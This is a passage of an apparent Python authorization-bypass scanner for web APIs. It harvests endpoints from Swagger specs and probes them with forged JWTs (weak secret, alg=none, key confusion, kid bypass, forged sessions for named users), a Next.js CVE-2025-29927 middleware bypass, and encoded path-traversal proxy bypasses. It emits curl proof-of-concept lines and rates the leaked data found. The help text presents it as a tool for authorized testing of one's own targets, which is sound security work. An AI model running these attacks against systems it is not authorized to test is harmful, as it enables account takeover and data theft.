    "cvc", "iban", "bank_account", "routing_number", "passport", "national_id", "pin_code",
)
MEDIUM_SEVERITY_KEY_SUBSTRINGS = (
    "email", "phone", "mobile", "address", "date_of_birth", "birthdate", "dob",
    "full_name", "first_name", "last_name", "salary", "income", "tax_id",
    "ip_address", "location", "gps",
)

_EMAIL_RE = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
_JWT_LIKE_RE = re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}')
_IBAN_RE = re.compile(r'\b[A-Z]{2}\d{2}[A-Z0-9]{10,30}\b')
_CARD_CANDIDATE_RE = re.compile(r'\b(?:\d[ -]?){13,19}\b')

SEVERITY_ORDER = {"LOW": 0, "MEDIUM": 1, "HIGH": 2}


def _luhn_valid(digits: str) -> bool:
    """Luhn checksum validation - filters out random 13-19 digit numbers
    (timestamps, IDs, etc.) that look like a card number by length but are not."""
    total = 0
    for i, ch in enumerate(reversed(digits)):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def _contains_valid_card_number(text: str) -> bool:
    for m in _CARD_CANDIDATE_RE.finditer(text):
        digits = re.sub(r'[ -]', '', m.group(0))
        if 13 <= len(digits) <= 19 and _luhn_valid(digits):
            return True
    return False


def _scan_json_keys(node, high_hits: set, medium_hits: set, _depth: int = 0):
    if _depth > 8:  # guard against deep/cyclic nesting
        return
    if isinstance(node, dict):
        for k, v in node.items():
            kl = str(k).lower()
            if any(sub in kl for sub in HIGH_SEVERITY_KEY_SUBSTRINGS):
                high_hits.add(f"key:{kl}")
            elif any(sub in kl for sub in MEDIUM_SEVERITY_KEY_SUBSTRINGS):
                medium_hits.add(f"key:{kl}")
            _scan_json_keys(v, high_hits, medium_hits, _depth + 1)
    elif isinstance(node, list):
        for item in node:
            _scan_json_keys(item, high_hits, medium_hits, _depth + 1)


def classify_body_severity(content: bytes) -> tuple[str, list]:
    """Returns (severity, indicators) for the body of a CONFIRMED bypass response.
    `indicators` is the list of matched signals (keys/patterns), for transparency
    about why that score was assigned."""
    try:
        text = content.decode("utf-8", errors="ignore")
    except Exception:
        return "MEDIUM", ["undecodable-binary-body"]

    if not text.strip():
        return "LOW", []

    high_hits: set = set()
    medium_hits: set = set()

    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        data = None
    if data is not None:
        _scan_json_keys(data, high_hits, medium_hits)

    if _EMAIL_RE.search(text):
        medium_hits.add("pattern:email")
    if _JWT_LIKE_RE.search(text):
        high_hits.add("pattern:jwt-like-token")
    if _IBAN_RE.search(text):
        high_hits.add("pattern:iban")
    if _contains_valid_card_number(text):
        high_hits.add("pattern:card-number(luhn-valid)")

    if high_hits:
        severity = "HIGH"
    elif medium_hits:
        severity = "MEDIUM"
    else:
        severity = "LOW"  # bypass confirmed, but no clearly sensitive data found in the body

    return severity, sorted(high_hits | medium_hits)


def aggregate_pair_severity(checks: list) -> tuple[Optional[str], list]:
    """Combines severity across all accepted checks of one pair (direct_url, template)
    into a single score - the worst (most critical) one is taken."""
    accepted = [c for c in checks if c.accepted and c.severity]
    if not accepted:
        return None, []
    worst = max(accepted, key=lambda c: SEVERITY_ORDER.get(c.severity, 0))
    all_indicators = sorted({ind for c in accepted for ind in c.sensitive_indicators})
    return worst.severity, all_indicators


def read_proxy_bypass_map(path: str) -> list[tuple[str, str]]:
    """Reads a file of 'direct_URL => bypass_template' pairs (one pair per line).
    The bypass template must contain the '{payload}' placeholder, into which each
    variant from PROXY_BYPASS_PAYLOADS is substituted in turn.

    Example line:
    https://host/dev/api/v1/pdt/items?company=test => https://host/dev/api/swagger/{payload}v1/pdt/items?company=test

    Empty lines and lines starting with '#' are ignored.
    """
    pairs = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for lineno, raw_line in enumerate(f, start=1):
                line = raw_line.strip()
                if not line or line.startswith("#"):
                    continue
                if "=>" not in line:
                    print(f"[!] --proxy-bypass-map line {lineno}: no '=>' separator, skipped: {line}", file=sys.stderr)
                    continue
                direct_url, template = line.split("=>", 1)
                direct_url = direct_url.strip()
                template = template.strip()
                if "{payload}" not in template:
                    print(f"[!] --proxy-bypass-map line {lineno}: no '{{payload}}' in template, skipped: {line}", file=sys.stderr)
                    continue
                pairs.append((direct_url, template))
    except FileNotFoundError:
        print(f"[!] File not found: {path}", file=sys.stderr)
        sys.exit(1)
    return pairs


def check_proxy_bypass_pair(direct_url: str, bypass_template: str, timeout: int, verify_ssl: bool,
                             headers: dict, ignore_trivial_body: bool = True,
                             extra_trivial_values: Optional[set] = None) -> tuple[bool, Optional[int], str, list["ProxyBypassCheck"]]:
    """Checks one pair (direct URL / bypass template).
    Returns (baseline_ok, baseline_status, verdict, checks).

    Verdicts:
    - "confirmed_bypass" - direct access is closed (not 200), but at least one bypass
      variant through the proxy path returned real data (200 + JSON/text + non-empty
      non-trivial body)
    - "protected"        - direct access is closed, and all bypass variants are rejected
    - "not_applicable"   - direct access is already open (200) - the bypass test is uninformative
    """
    baseline_status = None
    try:
        resp = safe_get(direct_url, timeout=timeout, verify=verify_ssl, headers=headers, allow_redirects=False)
        baseline_status = resp.status_code
        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
        body_size = len(resp.content)
        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
        baseline_ok = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                       and body_size > 0 and not trivial)
    except requests.exceptions.RequestException as e:
        print(f"[!] Direct request {direct_url} failed: {e}", file=sys.stderr)
        baseline_ok = False

    checks = []
    for payload in PROXY_BYPASS_PAYLOADS:
        bypass_url = bypass_template.replace("{payload}", payload)
        try:
            resp = safe_get(bypass_url, timeout=timeout, verify=verify_ssl, headers=headers, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            checks.append(ProxyBypassCheck(payload=payload, direct_url=direct_url, bypass_url=bypass_url, error=str(e)))
            continue

        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
        body_size = len(resp.content)
        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
        accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                    and body_size > 0 and not trivial)

        severity, indicators = (None, [])
        if accepted:
            severity, indicators = classify_body_severity(resp.content)

        checks.append(ProxyBypassCheck(
            payload=payload, direct_url=direct_url, bypass_url=bypass_url,
            status_code=resp.status_code, content_type=content_type, body_size=body_size,
            accepted=accepted, is_trivial_body=trivial,
            curl_poc=f"curl -skL --path-as-is '{bypass_url}'",
            severity=severity, sensitive_indicators=indicators,
        ))

    if baseline_ok:
        verdict = "not_applicable"
    elif any(c.accepted for c in checks):
        verdict = "confirmed_bypass"
    else:
        verdict = "protected"

    return baseline_ok, baseline_status, verdict, checks


def read_targets(path: str) -> list[str]:
    targets = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # If the line has no scheme - default to http://
                if not line.startswith(("http://", "https://")):
                    line = "http://" + line
                targets.append(line)
    except FileNotFoundError:
        print(f"[!] File not found: {path}", file=sys.stderr)
        sys.exit(1)
    return targets


def read_paths(path: str) -> list[str]:
    paths = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if not line.startswith("/"):
                    line = "/" + line
                paths.append(line)
    except FileNotFoundError:
        print(f"[!] Paths file not found: {path}", file=sys.stderr)
        sys.exit(1)
    return paths


def build_urls(targets: list[str], paths: Optional[list[str]]) -> list[str]:
    """Combines each target with each path (if paths are given)."""
    if not paths:
        return targets

    urls = []
    for target in targets:
        base = target.rstrip("/")
        for p in paths:
            urls.append(base + p)
    return urls


# ---------------------------------------------------------------------------
# Swagger / OpenAPI endpoint discovery (--swagger)
# ---------------------------------------------------------------------------
# Given a list of Swagger UI URLs (e.g. nuclei swagger-api output), this tries a
# set of common spec locations (swagger.json / openapi.json / *-ui-init.js),
# parses the OpenAPI/Swagger spec, and extracts every endpoint path. GET
# endpoints are expanded into concrete URLs (with {id}-style params replaced by
# a few probe values) which are then run through the same checks as any other
# target.
SWAGGER_JSON_SUFFIXES = [
    "/swagger/v1/swagger.json",
    "/swagger.json",
    "/v2/api-docs",
    "/api-docs",
    "/swagger/doc.json",
    "/api/swagger.json",
    "/openapi.json",
    "/swagger/developer/swagger.json",
]
SWAGGER_JS_SUFFIXES = [
    "/swagger/swagger-ui-init.js",
    "/api/swagger/swagger-ui-init.js",
    "/swagger-ui-init.js",
]
SWAGGER_HTTP_METHODS = ("get", "post", "put", "delete", "patch", "head", "options")
SWAGGER_ID_PROBE_VALUES = [1, 2, 3, "me", "current", "admin"]
_ID_PARAM_RE = re.compile(r'\{[^}]*[iI][dD][^}]*\}')
_URL_IN_LINE_RE = re.compile(r'https?://[^\s\]]+')


def get_base_from_url(url: str) -> str:
    """Scheme + host of a URL, e.g. https://host:8080 ."""
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def extract_swagger_from_js(js_content: str) -> Optional[dict]:
    """Extracts the Swagger spec embedded in a swagger-ui-init.js file
    (the "swaggerDoc": { ... } object), balancing nested braces."""
    try:
        start_marker = '"swaggerDoc":'
        pos = js_content.find(start_marker)
        if pos == -1:
            return None
        start_idx = pos + len(start_marker)
        while start_idx < len(js_content) and js_content[start_idx].isspace():
            start_idx += 1
        if start_idx >= len(js_content) or js_content[start_idx] != '{':
            return None
        brace_count = 1
        end_idx = start_idx + 1
        while end_idx < len(js_content) and brace_count > 0:
            if js_content[end_idx] == '{':
                brace_count += 1
            elif js_content[end_idx] == '}':
                brace_count -= 1
            end_idx += 1
        if brace_count != 0:
            return None
        return json.loads(js_content[start_idx:end_idx].strip())
    except Exception:
        return None


def generate_swagger_candidate_urls(swagger_ui_url: str) -> tuple[list[str], list[str]]:
    """Generates candidate spec URLs (JSON and JS) for a Swagger UI URL."""
    base_url = get_base_from_url(swagger_ui_url)
    path = urlparse(swagger_ui_url).path.lower()

    json_urls = [base_url + s for s in SWAGGER_JSON_SUFFIXES]
    js_urls = [base_url + s for s in SWAGGER_JS_SUFFIXES]

    if path.endswith("/swagger-ui.js"):
        json_urls += [f"{base_url}/swagger.json", f"{base_url}/v2/api-docs", f"{base_url}/api/swagger.json"]
        js_urls += [f"{base_url}/swagger-ui-init.js", f"{base_url}/swagger/swagger-ui-init.js"]
    elif "/swagger/index.html" in path:
        swagger_base = path.replace("/index.html", "")
        json_urls += [f"{base_url}{swagger_base}/v1/swagger.json",
                      f"{base_url}{swagger_base}/swagger.json",
                      f"{base_url}{swagger_base}/doc.json"]
        js_urls.append(f"{base_url}{swagger_base}/swagger-ui-init.js")
    elif path.endswith("/api/swagger"):
        api_base = path.replace("/swagger", "")
        json_urls += [f"{base_url}{api_base}/swagger.json",
                      f"{base_url}{api_base}/swagger/swagger.json",
                      f"{base_url}{api_base}/v2/api-docs"]
        js_urls.append(f"{base_url}/api/swagger/swagger-ui-init.js")
    elif "swagger" in path:
        if path.endswith((".js", ".html", ".htm")):
            json_urls.append(f"{base_url}{path.rsplit('.', 1)[0]}.json")
        dir_path = "/".join(path.split("/")[:-1])
        if dir_path:
            json_urls.append(f"{base_url}{dir_path}/swagger.json")
            js_urls.append(f"{base_url}{dir_path}/swagger-ui-init.js")

    return list(dict.fromkeys(json_urls)), list(dict.fromkeys(js_urls))


def has_id_parameter(url: str) -> bool:
    """True if the URL has an {...id...}-style path parameter."""
    return _ID_PARAM_RE.search(url) is not None


def generate_id_variants(url: str) -> list[str]:
    """Replaces {id}-style params with a few probe values (1/2/3/me/current/admin)."""
    return [_ID_PARAM_RE.sub(str(v), url) for v in SWAGGER_ID_PROBE_VALUES]


def extract_endpoints_from_swagger(swagger_ui_url: str, timeout: int, verify_ssl: bool,
                                   headers: dict, quiet: bool = False) -> list[tuple]:
    """Fetches and parses the Swagger/OpenAPI spec for one Swagger UI URL and
    returns a list of (full_endpoint_url, [http_methods]). Empty if no spec found."""
    base_url = get_base_from_url(swagger_ui_url)
    endpoints = []
    if not quiet:
        print(f"[swagger] processing: {swagger_ui_url}")

    json_urls, js_urls = generate_swagger_candidate_urls(swagger_ui_url)
    js_set = set(js_urls)

    for spec_url in json_urls + js_urls:
        try:
            resp = safe_get(spec_url, headers=headers, verify=verify_ssl, timeout=timeout)
        except requests.exceptions.RequestException:
            continue
        if resp.status_code != 200:
            continue

        data = None
        if spec_url in js_set or spec_url.endswith(".js"):
            data = extract_swagger_from_js(resp.text)
        else:
            ctype = resp.headers.get("Content-Type", "").lower()
            if "application/json" in ctype or spec_url.endswith(".json"):
                try:
                    data = resp.json()
                except (json.JSONDecodeError, ValueError):
                    data = None
        if not data:
            continue

        if isinstance(data, dict) and "paths" in data and (data.get("swagger") or data.get("openapi")):
            spec_paths = data.get("paths", {})
            if not quiet:
                print(f"[swagger]   spec found at {spec_url} "
                      f"(version {data.get('swagger') or data.get('openapi')}, {len(spec_paths)} endpoints)")
            for endpoint, methods_obj in spec_paths.items():
                if not isinstance(methods_obj, dict):
                    continue
                http_methods = [m.lower() for m in methods_obj.keys() if m.lower() in SWAGGER_HTTP_METHODS]
                if http_methods:
                    endpoints.append((base_url + endpoint, http_methods))
            return endpoints

    if not quiet:
        print(f"[swagger]   no spec found for {swagger_ui_url}")
    return endpoints


def read_swagger_sources(path: str) -> list[str]:
    """Reads Swagger UI URLs from a file. Supports both plain-URL lines and
    nuclei-style output lines (the first http(s) token on the line is taken).
    Empty lines and lines starting with '#' are ignored."""
    sources = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                m = _URL_IN_LINE_RE.search(line)
                if m:
                    sources.append(m.group(0))
    except FileNotFoundError:
        print(f"[!] File not found: {path}", file=sys.stderr)
        sys.exit(1)
    return list(dict.fromkeys(sources))


def build_swagger_target_urls(sources: list[str], timeout: int, verify_ssl: bool,
                              headers: dict, workers: int) -> list[str]:
    """Extracts endpoints from all Swagger sources (threaded), keeps GET endpoints,
    expands {id} params, and returns a deduped list of URLs to check."""
    all_endpoints = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {
            executor.submit(extract_endpoints_from_swagger, src, timeout, verify_ssl, headers): src
            for src in sources
        }
        for future in concurrent.futures.as_completed(futures):
            try:
                all_endpoints.extend(future.result())
            except Exception as e:
                print(f"[swagger] error processing {futures[future]}: {e}", file=sys.stderr)

    urls = []
    for url, methods in all_endpoints:
        if "get" not in methods:
            continue
        if has_id_parameter(url):
            urls.extend(generate_id_variants(url))
        else:
            urls.append(url)
    deduped = list(dict.fromkeys(urls))
    print(f"\n[swagger] extracted {len(all_endpoints)} endpoints from {len(sources)} sources -> "
          f"{len(deduped)} GET URLs to check (after id-variant expansion)")
    return deduped


def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers: dict,
                  jwt_test: bool = False, jwt_secret: str = "secret",
                  jwt_payload: Optional[dict] = None, jwt_header_name: str = "Authorization",
                  jwt_cookie_name: str = "access_token",
                  jwt_rsa_pubkey_pem: Optional[bytes] = None,
                  jwt_identities: Optional[list] = None,
                  ignore_trivial_body: bool = True,
                  extra_trivial_values: Optional[set] = None,
                  check_nextjs_cve: bool = False,
                  jwt_profiles: Optional[list] = None,
                  check_kid_bypass: bool = False) -> CheckResult:
    try:
        resp = safe_request(
            method,
            url,
            timeout=timeout,
            verify=verify_ssl,
            headers=headers,
            allow_redirects=False,
        )
    except requests.exceptions.RequestException as e:
        return CheckResult(url=url, ok=False, error=str(e))

    status_code = resp.status_code
    content_type_raw = resp.headers.get("Content-Type", "")
    # Content-Type may include a charset, e.g.: application/json; charset=utf-8
    content_type = content_type_raw.split(";")[0].strip().lower()
    body_size = len(resp.content)
    trivial_body = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
    baseline_ok = (status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                   and body_size > 0 and not trivial_body)

    jwt_checks = []
    jwt_verdict = None
    if jwt_test:
        # jwt_profiles: list of (profile_name, payload) - used under --full, where both
        # hardcoded profiles (generic_admin + azure_b2c) are run at once. Without it -
        # the normal single-profile mode (a single --jwt-payload/--jwt-azure-b2c/default).
        profiles = jwt_profiles if jwt_profiles else [(None, jwt_payload or default_jwt_payload())]
        per_profile_verdicts = []
        for profile_name, payload in profiles:
            if jwt_identities:
                checks = run_jwt_checks_multi_identity(
                    url, timeout, verify_ssl, headers, jwt_secret,
                    payload, jwt_identities,
                    jwt_header_name, jwt_cookie_name, rsa_pubkey_pem=jwt_rsa_pubkey_pem,
                    ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
                )
            else:
                checks = run_jwt_checks(
                    url, timeout, verify_ssl, headers, jwt_secret,
                    payload, jwt_header_name, jwt_cookie_name,
                    rsa_pubkey_pem=jwt_rsa_pubkey_pem,
                    ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
                )
            if profile_name:
                for c in checks:
                    c.kind = f"{profile_name}:{c.kind}"
            per_profile_verdicts.append(classify_jwt_verdict(baseline_ok, checks))
            jwt_checks.extend(checks)
        jwt_verdict = combine_jwt_verdicts(per_profile_verdicts)

    nextjs_cve_checks = []
    nextjs_cve_verdict = None
    if check_nextjs_cve:
        nextjs_cve_verdict, nextjs_cve_checks = check_cve_2025_29927(
            url, timeout, verify_ssl, headers, baseline_ok,
            ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
        )

    kid_checks = []
    kid_verdict = None
    if check_kid_bypass:
        # The payload here does not really matter (a full bypass still runs into the
        # issuer check), but the differential logic works for any payload.
        kid_payload = jwt_payload or default_jwt_payload()
        kid_verdict, kid_checks = run_kid_signature_bypass_check(
            url, timeout, verify_ssl, headers, kid_payload,
            jwt_header_name, jwt_cookie_name,
            ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
        )

    common = dict(
        jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
        nextjs_cve_checks=nextjs_cve_checks, nextjs_cve_verdict=nextjs_cve_verdict,
        kid_checks=kid_checks, kid_verdict=kid_verdict,
    )

    if status_code != 200:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason=f"status {status_code} != 200", **common,
        )

    if content_type not in ALLOWED_CONTENT_TYPES:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason=f"content-type '{content_type}' not in the allowed set {ALLOWED_CONTENT_TYPES}",
            **common,
        )

    if body_size == 0:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason="response body is empty (0 bytes)", **common,
        )

    if trivial_body:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason="body looks like a health-check response (OK/HEALTHY, etc.) - likely false positive",
            **common,
        )

    return CheckResult(
        url=url, ok=True, status_code=status_code,
        content_type=content_type, body_size=body_size, **common,
    )


def is_finding_result(result: "CheckResult") -> bool:
    """True if this CheckResult is worth writing to results.json - i.e. it is a
    finding: an unprotected endpoint (baseline 200 without a token), a confirmed
    JWT bypass, a confirmed kid bypass, or a confirmed CVE-2025-29927 bypass.
    Ordinary 'properly closed' and 404/network-error results are not written."""
    if result.ok:
        return True
    if result.jwt_verdict in ("confirmed_vulnerable", "signature_not_validated", "no_auth_required"):
        return True
    if result.nextjs_cve_verdict == "confirmed_bypass":
        return True
    if result.kid_verdict in ("confirmed_full_bypass", "signature_check_skipped_with_kid"):
        return True
    return False


def finding_result_dict(result: "CheckResult") -> dict:
    """asdict(result), but with jwt_checks/nextjs_cve_checks/kid_checks trimmed to
    only the meaningful attempts - so the file holds real PoCs, not dozens of
    rejected negative controls."""
    d = asdict(result)
    d["jwt_checks"] = [c for c in d["jwt_checks"] if c.get("accepted")]
    d["nextjs_cve_checks"] = [c for c in d["nextjs_cve_checks"] if c.get("accepted")]
    d["kid_checks"] = [
        c for c in d["kid_checks"]
        if c.get("accepted") or c.get("signature_stage_passed") or c.get("differs_from_baseline")
    ]
    return d


def write_results_incremental(output_path: str, results: list, targets: list, use_proxy_format: bool,
                               proxy_bypass_results: list) -> None:
    """Writes the currently accumulated FINDINGS to output_path immediately, as they
    become ready - not just once at the very end of the run. Only confirmed
    bypasses/vulnerabilities are written (see is_finding_result and
    verdict='confirmed_bypass' for proxy_bypass); cleanly closed endpoints and
    rejected attempts are not written to JSON, though they still appear in the
    console log during the run.

    The file is rewritten in full on each call (a simple, reliable scheme: the JSON
    on disk is always valid as a whole and can be tailed/parsed at any time), but
    the write goes through a temp file + os.replace (atomically), so the file is
    never left in a broken state if the process is interrupted mid-write.

    use_proxy_format is fixed once at the start of the run (from args.check_proxy_bypass),
    not from whether proxy_bypass_results is non-empty - otherwise the file format
    would change mid-run (first a flat list, then an object {results, proxy_bypass}),
    breaking consumers that have already started reading the file.
    """
    order = {url: i for i, url in enumerate(targets)}
    findings = [r for r in results if is_finding_result(r)]
    findings_sorted = sorted(findings, key=lambda r: order.get(r.url, 0))

    confirmed_proxy_bypass = [
        (direct_url, template, baseline_ok, baseline_status, verdict, checks)
        for direct_url, template, baseline_ok, baseline_status, verdict, checks in proxy_bypass_results
        if verdict == "confirmed_bypass"
    ]

    if use_proxy_format:
        payload = {
            "results": [finding_result_dict(r) for r in findings_sorted],
            "proxy_bypass": [
                {
                    "direct_url": direct_url,
                    "template": template,
                    "baseline_ok": baseline_ok,
                    "baseline_status": baseline_status,
                    "verdict": verdict,
                    "severity": aggregate_pair_severity(checks)[0],
                    "sensitive_indicators": aggregate_pair_severity(checks)[1],
                    "checks": [asdict(c) for c in checks if c.accepted],
                }
                for direct_url, template, baseline_ok, baseline_status, verdict, checks in confirmed_proxy_bypass
            ],
        }
    else:
        payload = [finding_result_dict(r) for r in findings_sorted]

    tmp_path = f"{output_path}.tmp"
    with open(tmp_path, "w", encoding="utf-8") as f:
        json.dump(payload, f, ensure_ascii=False, indent=2)
    os.replace(tmp_path, output_path)


def main():
    parser = argparse.ArgumentParser(description="Check targets for 200 OK, content-type and non-empty body")
    parser.add_argument("-f", "--file", required=True, help="Path to the targets file (one URL/domain per line)")
    parser.add_argument("-p", "--paths", help="Path to a file with paths (e.g. index.html) to be appended in turn to each target")
    parser.add_argument("--swagger", action="store_true",
                         help="Treat the -f file as a list of Swagger UI URLs (e.g. nuclei swagger-api "
                              "output; the first http(s) token on each line is used). Fetch and parse each "
                              "OpenAPI/Swagger spec, extract all GET endpoints (expanding {id}-style params "
                              "into 1/2/3/me/current/admin), and run the same checks against them. "
                              "The -p/--paths option is ignored in this mode (paths come from the spec).")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout in seconds (default 10)")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Number of parallel threads (default 10)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "HEAD", "POST"], help="HTTP method (default GET; for HEAD the body is usually 0 bytes)")
    parser.add_argument("-o", "--output", default="auth_results.json",
                         help="Path to save FINDINGS (only confirmed bypasses/vulnerabilities, "
                              "not every check) as JSON. Written incrementally during the run. "
                              "Default auth_results.json (in the current directory)")
    parser.add_argument("--no-verify-ssl", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--header", action="append", default=[], help="Extra header of the form 'Key: Value' (can be given multiple times)")
    parser.add_argument("--fail-only", action="store_true", help="Print only failed checks to the console")
    parser.add_argument("--tqdm", action="store_true",
                         help="Show only a progress bar instead of a per-URL/JWT/CVE/payload line-by-line log "
                              "(final summaries and found vulnerabilities are still printed at the end). "
                              "Requires the tqdm package (pip install tqdm); if missing a warning is printed "
                              "and the script continues with the normal line-by-line log")
    parser.add_argument("--allow-trivial-bodies", action="store_true",
                         help="Do not filter out trivial health-check responses (OK/HEALTHY/PONG, etc.) - by default they are treated as false positives and not counted")
    parser.add_argument("--ignore-body-value", action="append", default=[], metavar="VALUE",
                         help="Extra trivial response-body value to filter as a false positive (can be given multiple times), e.g. --ignore-body-value alive")

    cve_group = parser.add_argument_group("Known-CVE checks (only for authorized testing of your own targets)")
    cve_group.add_argument("--check-nextjs-cve", action="store_true",
                            help="Check CVE-2025-29927 (CVSS 9.1) - Next.js middleware bypass via the "
                                 "x-middleware-subrequest header, which lets you skip auth checks "
                                 "implemented in middleware entirely. Affects Next.js < 12.3.5 / < 13.5.9 / < 14.2.25 / < 15.2.3")

    jwt_group = parser.add_argument_group("JWT testing (only for authorized testing of your own targets)")
    jwt_group.add_argument("--jwt-test", action="store_true", help="Check bypass via JWT: weak secret (HS256 'secret'), alg=none (incl. case variants and empty payload), plus a negative control (garbage signature) to filter out false positives")
    jwt_group.add_argument("--jwt-kid-test", action="store_true",
                            help="Check whether JWT signature validation is disabled when a `kid` header is present. "
                                 "Differential test: the same forged token with a garbage signature is sent without kid "
                                 "and with kid (for alg HS256/RS256/none), and the responses are compared. If without kid "
                                 "the server complains about the signature/key, but with kid - about issuer/audience/exp, "
                                 "the signature is not verified when kid is present (verdict signature_check_skipped_with_kid)")
    jwt_group.add_argument("--jwt-secret", default="secret", help="Secret to sign the HS256 token (default 'secret')")
    jwt_group.add_argument("--jwt-payload", help="Path to a JSON file with claims for the token (default {\"sub\":\"admin\",\"role\":\"admin\",\"admin\":true})")
    jwt_group.add_argument("--jwt-header-name", default="Authorization", help="Header name for the Bearer variant (default Authorization, value will be 'Bearer <token>')")
    jwt_group.add_argument("--jwt-cookie-name", default="access_token", help="Cookie name for the cookie variant (default access_token)")
    jwt_group.add_argument("--jwt-azure-b2c", action="store_true", help="Use an Azure AD B2C style payload (iss/aud/oid/tfp/emails, etc.) as the default instead of the generic payload. Ignored if --jwt-payload is given")
    jwt_group.add_argument("--jwt-rsa-pubkey", help="Path to a file or URL of a public RSA key (PEM) for the RS256->HS256 key confusion attack. "
                                                      "Relevant for Azure B2C and any RS256 token: the key is always public "
                                                      "(available via .../discovery/v2.0/keys or /.well-known/jwks.json of the tenant); "
                                                      "if the JWKS returns a JWK (n/e), convert it to PEM beforehand (e.g. via python-jose/cryptography) and pass the PEM file path")
    jwt_group.add_argument("--jwt-claim", action="append", default=[], metavar="KEY=VALUE",
                            help="Override/add a specific claim in the payload (can be given multiple times), "
                                 "e.g. --jwt-claim oid=1111-2222 --jwt-claim emails='[\"victim@corp.com\"]'. "
                                 "The value is parsed as JSON; if that fails it is taken as a string")
    jwt_group.add_argument("--jwt-identities", help="Path to a JSON file with a list of identities to forge a session for specific users: "
                                                      "[{\"sub\":\"...\",\"oid\":\"...\",\"emails\":[\"user@corp.com\"],\"name\":\"...\"}, ...]. "
                                                      "Each entry is merged over the base payload, and the whole set of JWT forgeries "
                                                      "is run separately for EACH identity - to test session hijack as an arbitrary user, "
                                                      "not just generic admin access. "
                                                      "WARNING: greatly increases the number of requests (N identities x 7 token kinds x 2 deliveries per URL)")

    parser.add_argument("--full", action="store_true",
                         help="Run all checks at once: --jwt-test, --jwt-kid-test, --check-nextjs-cve and (if "
                              "--proxy-bypass-map is given) --check-proxy-bypass. Individual flags can still be "
                              "combined with --full as usual (e.g. --full --jwt-azure-b2c)")
    parser.add_argument("--exclude", metavar="CHECKS",
                         help="Comma-separated list of checks to exclude from the scan (applied AFTER --full "
                              "and the individual flags). Valid names: jwt, kid, nextjs, proxy "
                              "(aliases: jwt-test, kid-test/jwt-kid, nextjs-cve/cve, proxy-bypass). "
                              "The baseline reachability check always runs - use --skip-baseline to skip it. "
                              "Example: --full --exclude kid,proxy")

    proxy_group = parser.add_argument_group("Authorization bypass via a gateway proxy resource (only for authorized testing of your own targets)")
    proxy_group.add_argument("--check-proxy-bypass", action="store_true",
                              help="Check bypass of a protected resource via encoded path traversal (%%2e%%2e, etc.) "
                                   "inside an adjacent public proxy path (e.g. /api/swagger/{payload}v1/...). "
                                   "Relevant for AWS API Gateway {proxy+}, Swagger proxies and similar reverse-proxy routes "
                                   "where the authorizer is bound to a specific resource rather than the backend as a whole. Requires --proxy-bypass-map and/or --paths")
    proxy_group.add_argument("--proxy-bypass-map",
                              help="Path to a file of 'direct_URL => bypass_template' pairs (one pair per line); "
                                   "the template must contain the {payload} placeholder. Example: "
                                   "https://host/dev/api/v1/pdt/items?x=1 => https://host/dev/api/swagger/{payload}v1/pdt/items?x=1")
    proxy_group.add_argument("--skip-baseline", action="store_true",
                              help="Skip phase 1 (baseline check of each target x path without a bypass: "
                                   "200/401/403 + optional JWT/CVE) and go straight to proxy-bypass. "
                                   "Useful when you only need the proxy-path bypass, without extra output "
                                   "for direct requests to targets/paths (the baseline is still computed "
                                   "separately inside the proxy-bypass test for each pair)")

    args = parser.parse_args()

    if args.tqdm and _tqdm is None:
        print("[!] --tqdm: the tqdm package is not installed (pip install tqdm), continuing with the normal line-by-line log", file=sys.stderr)
        args.tqdm = False

    jwt_profiles = None  # None = normal single-profile mode; list = --full, both profiles at once
    if args.full:
        args.jwt_test = True
        args.jwt_kid_test = True
        args.check_nextjs_cve = True
        enabled = ["--jwt-test (profiles: generic_admin + azure_b2c)", "--jwt-kid-test", "--check-nextjs-cve"]

        # if the user did not explicitly set their own payload/claims/b2c mode - under
        # --full we run BOTH hardcoded JWT profiles at once, not one of them
        if not (args.jwt_payload or args.jwt_azure_b2c or args.jwt_claim):
            jwt_profiles = [("generic_admin", default_jwt_payload()), ("azure_b2c", azure_b2c_jwt_payload())]

        args.check_proxy_bypass = True
        if args.proxy_bypass_map:
